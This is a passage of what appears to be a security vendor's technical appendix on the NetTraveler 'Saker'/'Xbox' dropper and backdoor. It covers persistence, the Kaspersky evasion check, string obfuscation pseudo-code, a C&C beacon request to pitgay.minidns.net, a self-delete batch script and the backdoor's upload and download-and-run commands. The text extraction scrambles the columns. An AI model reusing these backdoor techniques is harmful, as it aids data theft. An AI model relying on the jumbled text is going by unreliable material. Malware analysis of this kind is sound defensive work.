+ber the actual serial number is converted from a 
+
+ous format strings options, which shows lack of 
+
+decimal integer to a hexadecimal number stored 
+
+experience in c/c++ development.
+
+as an Ascii string. the integer is converted to 
+
+40
+
+The NeTTravelerAPPendix A: mAlWAre technicAl AnAlysis
+
+Drive monitoring disk processing issue
+
+widespread among common software develop-
+
+As we mentioned above the drive monitoring 
+
+ers. ‘saker’ (‘xbox’) dropper and loader
+
+thread uses the same function to process 
+
+removable usb drives and network shares 
+
+attached as local drives. Visible separation of 
+
+these two types of disk drives (in the name of 
+
+the options Gsearch and usearch, where “u” 
+
+probably stands for “usb” and “G” is for “Glob-
+
+al”, and in separate logical branches of code 
+
+‘saKer’ (‘xbox’) dro PPer 
+and loader
+
+flow) is later misused, as the drive processing 
+
+mD5
+
+c239af6aff1226fa2 
+b2bb77dfec865ce
+
+routines is bound to usb drives. At least it read 
+
+u-prefixed options from dnlist.ini file, which 
+
+logically corresponds to the usb-type of disk 
+
+drive, but used for both. While this is a minor 
+
+issue and probably didn’t cause a serious 
+
+problem for the attackers, this shows that the 
+
+create date (GmT)
+
+2013.03.13 12:39:21
+
+Size
+
+67’072
+
+vulnerability 
+Targeted
+
+6.0 (msVc++ 6.0)
+
+developer felt lazy at some point and used 
+
+descriP tion
+
+copy and Paste approach to avoid creating 
+
+the module is non-packed Win32 Pe executable 
+
+extra code. it could also mean that one part of 
+
+file compiled in microsoft Visual c++ 6.0. Al-
+
+the code was created by one person and later 
+
+though no encryption or compression is used to 
+
+modified by another, who mistakenly over-
+
+protect or hide parts of the code, simple obfus-
+
+looked general code design.
+
+cation is applied to internal strings. the module 
+
+main purpose is to install and embedded dll file 
+
+Data decompression routine
+
+or load it during system startup.
+
+the malware uses a custom data compres-
+
+sion algorithm when uploading files to the 
+
+c&c server. While the decompression is not 
+
+technicAl d e tAils
+
+required for the work of the application, the 
+
+execution of the main function starts with ob-
+
+code for the decompression routine was also 
+
+taining local user startup directory. this path is 
+
+found in the malicious module. this clearly 
+
+appended with “\service.lnk”.
+
+indicates a design flaw and shows that the de-
+
+veloper didn’t review the code on a binary level 
+
+after it was compiled, which is common among 
+
+beginners among malware authors and quite 
+
+ 41
+
+the strings, which are used in the application are 
+
+iterating through %ProGrAmFiles% directory 
+
+stored in simple obfuscated form. For example, 
+
+and looking for “kaspersky lab” subdirectory. if 
+
+the “Kaspersky lab” is stored as “K.sp4r6ky 
+
+it finds Kaspersky products it quickly exits, if not 
+
+aa,”. the 1, 4, 6, 10 and 12 characters are re-
+
+it attempts to self-delete by running “cmd.exe /c 
+
+placed with hardcoded character constants as 
+
+del <moduleName>” and then exits.
+
+shown below:
+
+then the module gets local %temP% folder path 
+
+if the module was already installed in the system 
+
+and constructs paths “%Temp%\service.dll” 
+
+and is called “service.exe”, it checks if system mu-
+
+and “%Temp%\service.exe”.
+
+tex object called “SecuT!” already exists and exits 
+
+if it’s true. this is done to avoid multiple instances 
+
+After that the code checks if the current module 
+
+of the module from running simultaneously.
+
+file name is called “service.exe”.
+
+if current module is not called “service.exe”, 
+
+“%Temp%\service.dll” and saves a part of own 
+
+the module copies itself to “%tmP%\service.
+
+data to the new file. the data offset is hardcoded 
+
+After  that,  the  module  creates  a  new  file  at 
+
+exe” and creates corresponding lnK file in lo-
+
+as a string “46592”.
+
+cal user’s startup folder pointing to the freshly 
+
+created executable. the executable file is as-
+
+next, it attempts to load the “%temP%\service.
+
+signed an attribute “hidden” and started in a 
+
+dll” library file and call export function named 
+
+new process. then the module checks if Kasper-
+
+“JustTempfun”. After that the module enters 
+
+sky products are installed on local system by 
+
+an infinite sleep loop.
+
+42
+
+The NeTTravelerAPPendix A: mAlWAre technicAl AnAlysis
+
+‘saKer’ (‘xbox’) bacK door 
+(droPPed file)
+
+mD5
+
+6312bc2b156062 
+ba5358e7099a88bb95
+
+When this module is loaded with xbox loader 
+
+described above execution is started with Just-
+
+create date (GmT)
+
+ 2013.03.13 12:35:11
+
+tempFun exported function. this function begins 
+
+Size
+
+ 46’592
+
+vulnerability 
+Targeted
+
+ 6.0 (msVc++ 6.0)
+
+with deobfuscation of the strings used further:
+
+pitgay.minidns.net
+
+8090BBBBBBBBBBBB
+
+descriP tion
+
+GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG
+
+the module is a non-packed Win32 dll exe-
+
+SakerEvent
+
+cutable file compiled in microsoft Visual c++ 
+
+FFFFFFFFFFFFFFFF
+
+6.0. Although no encryption or compression is 
+
+Proxy
+
+used to protect or hide parts of the code, simple 
+
+HHHHHHHHHHHHHHHH
+
+obfuscation is applied to internal strings. the 
+
+module is to clearly a backdoor application that 
+
+obviously pitgay.minidns.net is the c&c server 
+
+enables an attacker to manage files, get infor-
+
+domain name. 8090 is the port the malware con-
+
+mation about local disk drives, download and 
+
+nects to. As for the “GGG...”, “FFF...” and “hhh...” 
+
+start new executables. this backdoor is probably 
+
+strings, according to the further code analysis 
+
+authored by the same developer who created the 
+
+they are used as a placeholders for the hardcode 
+
+Gh0st / Zegost rAt.
+
+proxy settings:
+
+the “FFF...” placeholder may contain “Proxy” 
+
+string instead of “F” sequence which works as a 
+
+technicAl d e tAils
+
+flag to use the proxy settings from the “GGG...” 
+
+this module has 2 export functions: JustTemp-
+
+placeholder in the form that wininet accepts 
+
+fun and servicemain. module main function as 
+
+(according to msdn, the format is “http=http://
+
+well as servicemain are empty procedures. so 
+
+http_proxy other”). the “hhh...” placeholder is 
+
+far, all functionality of the module is located in 
+
+for proxy username and password.
+
+JusttempFun function.
+
+the thread collects information about the local 
+
+meanwhile, there is another known malicious 
+
+system, such as
+
+dll which has exactly these export names - 
+
+ > os version
+
+Gh0st rAt, that was also developed by chinese.
+
+ > cPu type
+
+ 43
+
+ > used and available memory
+
+this algorithm not only adds obfuscation but 
+
+ > local system name
+
+also adds some redundancy, which doubles the 
+
+ > used  and  available  disk  space  of  the 
+
+size of the input string.
+
+drive c:\
+
+the module attempts to connect to a c&c server 
+
+the last value is converted to a hexstring of 8 
+
+and issue using the following url:
+
+characters and xor-ed with current computer 
+
+name. the purpose of this value is unclear.
+
+http://pitgay.minidns.net:8090/3010...
+
+then the information collected before is encrypt-
+
+Also, it uses a hardcoded user-Agent string. 
+
+ed using simple string obfuscation algorithm, 
+
+there is not query string parameters, the data 
+
+shown below in a pseudo code:
+
+is transferred in a form of cGi path consisting of 
+
+void ObfuscateString(char* strIn, char* strOut, int 
+
+makes such requests rather unique. 3010 most 
+
+hex numbers only and prefixed with 3010, which 
+
+nLen)
+
+{
+
+char c;
+
+for (i=0;i <nLen; i++)
+
+{
+
+c = strIn[i] % 32;
+
+if(c <= 9)
+
+strOut[2*i] = c+0x30;
+
+else
+
+strOut[2*i] = c+0x37;
+
+if(strIn[i] <= 9)
+
+likely defines client request id. here is how a 
+
+request may look:
+
+GET /301000000000F0FD...0000000000000000000
+
+000000 HTTP/1.1
+
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win-
+
+dows NT 5.0; .NET CLR 1.1.4322)
+
+Host: tsgoogoo.net
+
+Host: pitgay.minidns.net:8090
+
+Cache-Control: no-cache
+
+strOut[2*i+1] = strIn[i]+0x30;
+
+the module checks the server response code 
+
+else
+
+and if that is httP 200, it reads 2 dWord values 
+
+strOut[2*i+1] = strIn[i]+0x37;
+
+(lets call them ParamA and Paramb) from the the 
+
+}
+
+}
+
+44
+
+server response.
+
+the first dWord (ParamA) defines the command 
+
+and following execution path. below is the inte-
+
+ger values and commands description:
+
+The NeTTravelerAPPendix A: mAlWAre technicAl AnAlysis
+
+1020: Shutdown
+
+1021: Shutdown
+
+1029: file manager
+
+the  command  spawns  a  new  thread  which 
+
+opens a new session with the server to provide 
+
+both 1020 and 1021 commands are used to 
+
+file management operations.
+
+interrupt execution of the module and terminate 
+
+the main thread. the module also sets local 
+
+the new thread makes 2 httP Get requests 
+
+thread privileges to enable global system shut-
+
+to the server, which are identical to the 3010 
+
+down, however this is not used later and proba-
+
+request described above. the only difference 
+
+bly represents some remains of the code written 
+
+is the request id, which is 4001 and 4002 for 
+
+earlier or another variant of the code. this is also 
+
+the first and second requests correspondingly. 
+
+confirmed by by the shutdown procedure exe-
+
+the output of the 4001 request is ignored, while 
+
+cuted afterwards, which is designed to disable 
+
+request 4002 is interpreted.
+
+Windows hook mechanism while it wasn’t used 
+
+previously anywhere in the code.
+
+the server response contains 2 dWord values: 
+
+1022: Self-remove
+
+lets call them filecmdid and DataSize. if data-
+
+size is non-zero the module fetches additional 
+
+this command is used to self-remove current 
+
+data which length is specified in the datasize 
+
+module and stop its execution. it attempts to 
+
+option.
+
+create a local batch file named del.bat with the 
+
+following contents and run it:
+
+the Filecmdid defines which operation must be 
+
+@echo off
+
+ping /n 5 127.0.0.1 >nul
+
+executed. it can be one of the following values:
+
+5001: Get drive information. Provides informa-
+
+>nul del /f/s/q/a <CurrentModuleDir>\service.exe
+
+tion about specified disk drive: free space, drive 
+
+>nul del /f/s/q/a <CurrentModuleDir>\service.dll
+
+type. client command success code is 0, error 
+
+>nul del %0 /s/q/a/f del.bat
+
+code is 7004.
+
+Please note non-standard way to call Windows 
+
+5002: Get file information. Provides information 
+
+command line interpreter which starts from re-
+
+about specified file: file times, attributes. client 
+
+direction of output to nul virtual device. Also, 
+
+command success code is 0, error code is 7003.
+
+the command arguments are not separated with 
+
+space or tab characters, and it might look invalid, 
+
+5003: Get directory information. Provides 
+
+however cmd.exe on Windows xP, Windows 7 and 
+
+information about specified directory: directory 
+
+Windows 8 executed it correctly without a problem.
+
+ 45
+
+times, attributes, full size. client command suc-
+
+of the server should contain file data to write to 
+
+cess code is 0, error code is 7003.
+
+the already opened file and execute right away.
+
+5004: Get directory listing. Provide simple di-
+
+5026: upload file to the server. the command 
+
+rectory listing, which includes file names, sizes, 
+
+is used to read local file and transfer it to the 
+
+last write time. client command success code is 
+
+server. it gets file information, including time-
+
+0, error code is 7001.
+
+stamps and size and spawns a new thread. if any 
+
+5006: create directory. create a new directory, 
+
+ror code 7003 to the server. otherwise it reports 
+
+which full path is provided by the server. client 
+
+success code 0 and spawns a new thread. the 
+
+command success code is 0, error code is 7016.
+
+new thread reads the file specified in the request 
+
+of those operations fails the module reports er-
+
+and uploads it to the server.
+
+5008: list drives. list available disk drives with 
+
+information about free space. client command 
+
+1039: Download and run new module.
+
+success code is 0, error code is not defined.
+
+the module uses Paramb as an integer value 
+
+indicating a length of a string to read next from 
+
+5009: run application. run local application 
+
+the server response. the received string will be 
+
+with path and command line arguments passed 
+
+used as a newFilename. then it reads another 
+
+from the server. client command success code 
+
+dWord value from the server response and 
+
+is 0, error code is 7005.
+
+interprets it as a size of the following data to 
+
+read. After that a new directory “internet ex-
+
+5017: Get recursive directory listing. Provide 
+
+plorer” is created in the directory of the current 
+
+recursive directory listing. client command suc-
+
+running module. then the module creates a new 
+
+cess code is 0, error code is 7000.
+
+file using the value newFilename pushed by the 
+
+server. the module makes 2 attempts to start a 
+
+5025: run pushed executable. this command 
+
+new process: by calling createProcessA system 
+
+is used to save file pushed by the server and run 
+
+APi and shellexecuteA if the previous call failed.
+
+instantly. When this command is received the 
+
+module checks if it can create a new file, which 
+
+the code was designed to support more com-
+
+name is passed by the server response. if it 
+
+mands (1028, 1029, 1032, 1033, 1034, 1035, 
+
+fails it submits error code 7003. then it spawns 
+
+1036), however they are now falling into com-
+
+a new thread which issues a new httP Post 
+
+mand 1029 handler and then ignored. We cre-
+
+request with command id 3005 and system in-
+
+ated a chart showing a tree of commands de-
+
+formation attached in the cGi Path. the request 
+
+pendencies:
+
+46
+
+The NeTTravelerAPPendix A: mAlWAre technicAl AnAlysis
+
+the execution of this command processing thread continues in a loop until it is interrupt-
+
+ed by shutdown command coming from the server. the code starts new loop iteration 
+
+after hardcoded value of 30 seconds.
+
+ 47
+
+
